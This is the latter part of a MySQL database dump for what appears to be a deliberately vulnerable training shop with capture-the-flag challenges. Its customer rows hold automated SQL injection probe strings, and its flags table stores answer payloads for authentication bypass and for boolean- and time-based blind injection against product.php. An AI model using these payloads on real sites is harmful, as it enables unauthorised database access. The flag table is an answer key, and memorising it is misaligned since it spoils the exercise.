(613, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 7407=7407 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)))|[Fvmz', ''),
(614, 'wtaG', '', 'Fvmz\" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695)-- EWSf', ''),
(615, 'wtaG', '', 'Fvmz\") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND (\"pfII\"=\"pfII', ''),
(616, 'wtaG', '', 'Fvmz\")) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND ((\"RRam\"=\"RRam', ''),
(617, 'wtaG', '', 'Fvmz\"))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND (((\"zhnv\"=\"zhnv', ''),
(618, 'wtaG', '', 'Fvmz\" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND \"KwoP\"=\"KwoP', ''),
(619, 'wtaG', '', 'Fvmz\") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND (\"LTfM\" LIKE \"LTfM', ''),
(620, 'wtaG', '', 'Fvmz\")) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND ((\"zoyI\" LIKE \"zoyI', ''),
(621, 'wtaG', '', 'Fvmz\"))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND (((\"YFRX\" LIKE \"YFRX', ''),
(622, 'wtaG', '', 'Fvmz\" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695) AND \"xIPT\" LIKE \"xIPT', ''),
(623, 'wtaG', '', 'Fvmz\") WHERE 6893=6893 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695)-- kpva', ''),
(624, 'wtaG', '', 'Fvmz\" WHERE 6063=6063 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6695=6695,1))),0x7171787671),6695)-- ePjC', ''),
(625, 'wtaG', '', '(SELECT CONCAT(0x7171767871,(ELT(7836=7836,1)),0x7171787671))', ''),
(626, 'fudge_pancakes', 'fudge_pancakes', 'fudge_pancakes', 'fudge_pancakes');

-- --------------------------------------------------------

--
-- Table structure for table `customers_data`
--

CREATE TABLE `customers_data` (
  `id` int NOT NULL,
  `customer_id` int NOT NULL,
  `first_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address1` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address2` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `city` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `country` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `postcode` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `customers_data`
--

INSERT INTO `customers_data` (`id`, `customer_id`, `first_name`, `last_name`, `address1`, `address2`, `city`, `country`, `postcode`) VALUES
(1, 1, 'azmol', 'miah', '1234 main st', 'Apartment 2', 'Manchester', 'United Kingdom', 'ol12nt'),
(2, 3, 'Mike', 'Clare', '1234 main st', 'Apartment 2', 'Manchester', 'United Kingdom', 'ol12nt'),
(3, 4, 'Nunya', 'Beeswax', '237456', '12345', 'Manchester', 'United Kingdom', '1345'),
(4, 626, 'fudge_pancakes', 'fudge_pancakes', '1234 fudge_pancakes', '', 'Manchester', 'United Kingdom', 'fudge_pancakes');

-- --------------------------------------------------------

--
-- Table structure for table `flags`
--

CREATE TABLE `flags` (
  `id` int NOT NULL,
  `flag_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `flag_answer` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `flags`
--

INSERT INTO `flags` (`id`, `flag_name`, `flag_answer`) VALUES
(1, 'No Burp Answer Required', ''),
(2, 'codenation{In-Band_SQL_Injection}', 'admin:admin'),
(3, 'codenation{Blind_SQL_Injection_Auth-Bypass}', '\' or 1=1;#'),
(4, 'codenation{Blind_SQL_Injection_Boolean-Based}', 'product.php?id=0%20or%20database()%20like%20%22cvsa%22;'),
(5, 'codenation{SQL_Injection_Time-Based}', 'product.php?id=0%20or%20if(database()=%22cvsa%22,%20sleep(2),%20sleep(5));'),
(6, 'codenation{SQL_Injection_Drop-Database}', ''),
(7, 'codenation{Cross-Site-Scripting}', ''),
(8, 'image', ''),
(9, 'No Apache2 Answer Required', '');

-- --------------------------------------------------------

--
-- Table structure for table `flags_achieved`
--

CREATE TABLE `flags_achieved` (
  `id` int NOT NULL,
  `customer_id` int NOT NULL,
  `flag_id` int NOT NULL,
  `flag_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `flags_achieved`
--

INSERT INTO `flags_achieved` (`id`, `customer_id`, `flag_id`, `flag_name`, `created_at`) VALUES
(19, 5, 1, 'No Burp Answer Required', '2021-12-02 10:08:26'),
(20, 5, 2, 'codenation{In-Band_SQL_Injection}', '2021-12-02 10:19:21'),
(21, 5, 3, 'codenation{Blind_SQL_Injection_Auth-Bypass}', '2021-12-02 10:20:43'),
(22, 5, 4, 'codenation{Blind_SQL_Injection_Boolean-Based}', '2021-12-02 10:36:10'),
(23, 5, 5, 'codenation{SQL_Injection_Time-Based}', '2021-12-02 10:57:45'),
(24, 5, 6, 'codenation{SQL_Injection_Drop-Database}', '2021-12-02 11:04:39'),
(25, 5, 7, 'codenation{Cross-Site-Scripting}', '2021-12-02 11:10:35'),
(27, 5, 8, 'image', '2021-12-02 11:36:34'),
(28, 5, 9, 'No Apache2 Answer Required', '2021-12-02 11:36:52'),
(38, 4, 1, 'No Burp Answer Required', '2021-12-03 13:54:30');

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` int NOT NULL,
  `customer_id` int NOT NULL,
  `total_price` int NOT NULL,
  `order_status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `customer_id`, `total_price`, `order_status`, `created_at`) VALUES
(1, 1, 1500, 'Order Placed', '2021-11-24 15:17:37'),
(2, 1, 4340, 'Order Placed', '2021-11-25 09:54:04'),
(3, 1, 1000, 'Order Placed', '2021-11-25 15:10:09'),
(4, 3, 1000, 'Order Placed', '2021-11-26 11:26:01'),
(5, 4, 10000, 'Order Placed', '2021-11-26 12:40:33'),
(6, 4, 5000, 'Order Placed', '2021-11-26 12:42:51'),
(7, 626, 3960, 'Order Placed', '2021-12-10 13:38:54');

-- --------------------------------------------------------

--
-- Table structure for table `orders_items`
--

CREATE TABLE `orders_items` (
  `id` int NOT NULL,
  `order_id` int NOT NULL,
  `product_id` int NOT NULL,
  `quantity` int NOT NULL,
  `product_price` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `orders_items`
--

INSERT INTO `orders_items` (`id`, `order_id`, `product_id`, `quantity`, `product_price`) VALUES
(1, 1, 10, 3, 500),
(2, 2, 9, 3, 780),
(3, 2, 10, 4, 500),
(4, 3, 10, 2, 500),
(5, 4, 10, 2, 500),
(6, 5, 14, 1000, 10),
(7, 6, 10, 10, 500),
(8, 7, 7, 1, 600),
(9, 7, 14, 6, 560);

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `id` int NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` float DEFAULT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `cat_id` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `title`, `description`, `image`, `price`, `created_at`, `cat_id`) VALUES
(4, 'Apple Iphone 13 Hero', 'Apple Iphone 13 Hero', 'images/Apple_iphone13_hero_09142021_inline.jpg.large.jpg', 450, '2021-12-02 13:22:10', 1),
(5, 'Samsung Galaxy S8', 'Samsung Galaxy S8', 'images/iphone-x-samsung-galaxy-s8-iphone-7-smartphone-png-favpng-7ke4DBbj5kLrbQftMD6XuN56h.jpeg', 350, '2021-12-02 13:22:36', 2),
(7, 'Apple Iphone Red', 'Apple Iphone Red', 'images/download (1).jpeg', 600, '2021-12-10 09:50:54', 0),
(8, 'Apple Iphone Gold', 'Apple Iphone Gold', 'images/download (2).jpeg', 600, '2021-12-10 09:51:38', 0),
(9, 'Apple Iphone Black', 'Apple Iphone Black', 'images/download (3).jpeg', 650, '2021-12-10 09:51:58', 0),
(10, 'Apple Iphone Purple', 'Apple Iphone Purple', 'images/download.jpeg', 400, '2021-12-10 09:52:17', 0),
(11, 'Apple Iphone Blue', 'Apple Iphone Blue', 'images/iphone-13-mini-blue-select-2021.jpeg', 760, '2021-12-10 09:52:41', 0),
(12, 'Apple Iphone Pro', 'Apple Iphone Pro', 'images/iphone-13-pro-max.jpeg', 650, '2021-12-10 09:53:03', 0),
(14, 'Apple Iphone XR', 'Apple Iphone XR', 'images/iphone-xr-white-select-201809.png', 560, '2021-12-10 09:54:01', 0),
(15, 'Samsung Galaxy S10', 'Samsung Galaxy S10', 'images/samsung-s10plus.png', 800, '2021-12-10 09:54:25', 0),
(16, 'Apple Iphone Red', 'Apple Iphone Red', 'images/swappie-product-iphone-11-red-back.jpeg', 400, '2021-12-10 09:54:48', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`cat_id`);

--
-- Indexes for table `customers`
--
ALTER TABLE `customers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `customers_data`
--
ALTER TABLE `customers_data`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `flags`
--
ALTER TABLE `flags`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `flags_achieved`
--
ALTER TABLE `flags_achieved`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders_items`
--
ALTER TABLE `orders_items`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `cat_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `customers`
--
ALTER TABLE `customers`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=627;

--
-- AUTO_INCREMENT for table `customers_data`
--
ALTER TABLE `customers_data`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `flags`
--
ALTER TABLE `flags`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `flags_achieved`
--
ALTER TABLE `flags_achieved`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=47;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `orders_items`
--
ALTER TABLE `orders_items`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
